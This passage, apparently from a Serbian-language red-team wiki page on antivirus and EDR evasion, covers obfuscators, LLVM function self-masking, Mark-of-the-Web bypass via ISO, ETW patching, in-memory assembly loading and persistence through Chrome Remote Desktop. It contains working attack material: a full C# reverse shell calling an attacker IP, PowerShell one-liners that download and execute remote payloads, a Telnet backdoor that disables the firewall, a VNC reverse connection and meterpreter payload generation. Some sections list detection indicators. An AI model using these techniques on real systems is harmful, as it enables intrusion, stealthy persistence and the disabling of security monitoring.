3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blokove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload.  Malware ga često čuva kao TLV-enkodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj niz koraka vraća tok izvršavanja **bez** pokretanja zlonamernog uzorka – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM skupa za kompajliranje, koji omogućava veću bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator prikazuje kako se jezik `C++11/14` može koristiti za generisanje obfusciranog koda tokom kompajliranja, bez spoljnog alata i izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfusciranih operacija generisanih pomoću C++ template metaprogramming framework-a, što dodatno otežava posao osobi koja pokušava da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscira različite PE datoteke, uključujući .exe, .dll i .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne datoteke.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu code obfuscation u jezicima koje podržava LLVM, a koristi ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda tako što regularne instrukcije pretvara u ROP lance, čime narušava uobičajenu predstavu o normalnom toku izvršavanja.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL datoteke u shellcode, a zatim da ih učita

### LLVM compiler-assisted per-function self-masking

Umesto da maskira ceo implant samo dok miruje, izmenjeni LLVM X86 backend može da XOR-maskira odabrane funkcije kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent entry/exit stub-ove oko završnog machine code-a i emituje jedan zajednički masking handler u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo treba uraditi nakon instruction selection i optimizacije, jer transformacija mora da obuhvati **svaku emitovanu instrukciju za povratak** i da zna tačan x86 raspored. `MachineFunctionPass` koji se izvršava pre emitovanja pronalazi poslednju `MachineInstr::isReturn()`, briše je kako bi se poslednja putanja nastavila u dodati epilog, a ranije instrukcije za povratak zamenjuje sa `JMP_1 handler`. Zadržite svako compiler-generated rastavljanje steka i okvira koje prethodi instrukciji za povratak; preusmerite samo samu instrukciju za povratak.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emituju stub-ove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da prološka grana cilja kasniji epilog; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handler-a mogu umesto toga da se emituju kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako ništa nije izmenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže loader-relocated pokazivač na funkciju i dužinu u runtime-u u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na pomeraju `+8` u zapisu, čime čita dužinu i njeno padding polje, a zatim pomera pokazivač na sledeći zapis za `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa se pri runtime pretrazi vidi `.funcmet`. Spoljni patcher dodaje izvršnu `.stub` sekciju, čuva stari RVA ulazne tačke u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija baznu adresu image-a iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi pronašao već uvezeni `VirtualProtect` i izvršava se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata-e. Njena trajno čitljiva prološka beleži početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače telo koje još nije maskirano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom normalnog poziva, prološka poziva isti simetrični handler da dekodira telo. Poslednja putanja nastavlja se u dodati epilog, dok svaki raniji povratak skače direktno do zajedničkog handler-a. Normalni epilog takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` instrukcija handler-a troši povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (`0x46` bajtova u ovoj verziji), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt koristeći niži bajt ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja tako dekodira pri ulasku i kodira pri svakom normalnom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori sa visokim signalom za ovaj dizajn obuhvataju:<sup>[[38]](#references)[[39]](#references)</sup>

- ulaznu tačku unutar izvršne `.stub` sekcije i `.funcmet` sekciju koja sadrži ključ i relocirane pokazivače na `.text`;
- PEB, import-table i section-table parsiranje pre CRT-a, praćeno pozivima preko svakog metadata pokazivača;
- identične PIC prologe sa `call`/`pop` i mnoge povratne tačke preusmerene na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` promenama i bajt-po-bajt XOR upisima u izvršne stranice koje podržava image.

Ovo je evazija memory scanner-a, a ne kriptografska zaštita: patch-ovana datoteka i dalje sadrži originalno nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. Jednobajtni XOR, čitljivi metadata podaci i fiksna granica `0x46` takođe omogućavaju jednostavan offline oporavak.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su thread-local, ali izmenjene stranice koda važe za ceo proces. Zato konkurentni ili rekurzivni ulasci mogu ponovo da preklapaju instrukcije dok ih drugo izvršavanje koristi; izuzeci i netrivijalni izlazi iz funkcije takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je zaista zabeležena preko `lpflOldProtect`, izbegava hard-coded dužine stub-a, proveri poravnanje steka za x64 na putanjama `call` i `jmp` i pozove `FlushInstructionCache` nakon ponovnog upisa izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherentnost instrukcionog keša kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti pokretanje datoteke (iako se datoteka i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kog su preuzete.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih zapakujete u neku vrstu kontejnera, kao što je ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alatka koja pakuje payload-e u izlazne kontejnere kako bi izbegla Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za evidentiranje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **evidentiraju događaje**. Međutim, bezbednosni proizvodi ga mogu koristiti i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (zaobilazi), moguće je i učiniti da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu bez evidentiranja događaja. To se postiže izmenom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW evidentiranje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju, bez upisivanja na disk, trebaćemo da brinemo samo o patchovanju AMSI-ja za ceo proces.

Većina C2 okruženja (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# assemblies u memoriji, ali to se može postići na različite načine:

- **Fork\&Run**

Ovaj pristup podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, njegovo izvršavanje i gašenje novog procesa po završetku. Ovaj pristup ima i prednosti i nedostatke. Prednost metode fork and run je što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da postoji **mnogo veća verovatnoća** da će naš **implant preživeti** ako nešto pođe po zlu ili bude otkriveno tokom post-exploitation aktivnosti. Nedostatak je **veća verovatnoća** da će vas otkriti **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovaj pristup podrazumeva ubacivanje zlonamernog post-exploitation koda **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti beacon**, jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies možete učitati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video autora S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly prepakovanje .NET alata (WasmForge)

Uobičajene `execute-assembly` tehnike zadržavaju prepoznatljiv MSIL i na kraju inicijalizuju CLR. **WasmForge** umesto toga menja osnovu izvršavanja: prebacuje C# projekat na eksperimentalni NativeAOT-LLVM WASI target, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Rezultujućem procesu nisu potrebni CLR, JIT ni `dotnet` host na ciljnom sistemu, pa pravila zasnovana isključivo na nazivima managed assemblies, učitavanju CLR-a, AMSI-ju ili .NET ETW-u gube direktnu vidljivost. Ovo je tehnika za izbegavanje detekcije i pakovanje, a ne zaobilaženje granice privilegija — guest zadržava dozvole originalnog alata i njegovo uočljivo ponašanje na nivou OS-a.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje je Docker okruženje projekta, jer uključuje .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` se automatski prepoznaje; jednokratna izgradnja obavlja migraciju, zakrpe kompatibilnosti, WASM kompilaciju, izradu PE datoteke i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje problema ili pregled generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` da bi izbegla kodiranje WASI Preview 2 komponenti i proizvela običan modul koji očekuje ugrađeno runtime okruženje.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# sa x64 Win32

Ovo nije transparentno ponovno kompajliranje. NativeAOT-WASI nema neke funkcije BCL-a namenjene Windows-u ili ih menja, a wasm32 gost obično dodeljuje slotove pokazivačima od četiri bajta, dok x64 API-ji mogu da vrate pokazivače od osam bajtova. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Patcher izvornog koda ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive registru, cevima, WMI-ju, identitetu, servisima direktorijuma, verzijama datoteka, LSA-u i sličnim funkcijama na pomoćne funkcije `Wf*`.
2. P/Invoke skener generiše NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa povezanim C bridge simbolima umesto da se deklarisani DLL dinamički učitava unutar gosta.
3. Pokazivači namenjeni hostu koriste `ulong` u C#-u i `uint64_t` u C-u. Generički dispečer prosleđuje poziv Win32 obrađivaču na hostu; `out8_mask` označava stvarne izlazne slotove od osam bajtova čije gornje polovine treba sačuvati. Za neoznačene izlaze oblika wasm32 koristi se zaštita snapshot/restore kako upis x64 ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje ne odgovaraju generičkom syscall dispečiranju, kao što su pristup kešu LSA karata, Kerberos/BCrypt operacije sa strukturiranim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, omotač za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač vrednosti i dužina izlazni slotovi od osam bajtova. Sam omotač ostaje generički i prosleđuje naziv DLL-a, naziv izvoza, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i promene fokusa detekcije

Kod koji intenzivno koristi refleksiju, dinamičko učitavanje assembly-ja, proizvoljne native callback-ove i složene x64 strukture koje se vraćaju u WASM memoriju i dalje može zahtevati zakrpe za pojedinačne alate ili potpuno otkazati. Generički WASI Preview 2 socket-i takođe mogu da naiđu na no-op stub-ove, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build, umesto da pretpostavite da su funkcije jednake.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika pomera telemetriju, umesto da payload učini nevidljivim. Detekcija može da se usmeri na PE koji sadrži ili materijalizuje WASM modul, ponašanje nalik Wazero runtime-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generičko direktno pozivanje Win32 funkcija, anomalije u potpisivanju i PE resursima, kao i na rezultujuće API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), zlonamerni kod je moguće izvršavati pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **okruženju interpretera instaliranom na SMB deljenom resursu pod kontrolom napadača**.

Omogućavanjem pristupa interpreter binarnim datotekama i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod napisan u ovim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem jezika Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfusciranih reverse shell skripti napisanih na ovim jezicima pokazalo se uspešnim.

## Ponovno hostovanje WebAssembly-ja radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što je EDR ili AV. Smanjenje privilegija token-a može ostaviti proces pokrenutim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili otklanjanja problema.

Da bi se ovo sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handles za tokene bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je samo instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program neprimetno na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na Next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebna podešavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije na jednom sistemu, pa je gotovo nemoguće ostati potpuno neprimećen u zrelim okruženjima.

Svako okruženje sa kojim se suočite imaće svoje prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) da biste stekli uvid u naprednije tehnike izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno sjajno predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender prepoznaje kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje** kao zlonameran, a zatim će ga izdvojiti za vas.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), a usluga je dostupna i na otvorenom webu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet server**

Do Windows 10 uključujući sve verzije Windows-a dolazio je **Telnet server**, koji ste mogli da instalirate (kao administrator) pomoću sledeće komande:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se pokreće pri pokretanju sistema i pokrenite ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne instalacija)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta konekcija**

**Napadač** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900`, kako bi bila **spremna** da prihvati obrnutu **VNC konekciju**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste očuvali stealth, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` radi pomoći jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

U okviru GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# pomoću kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

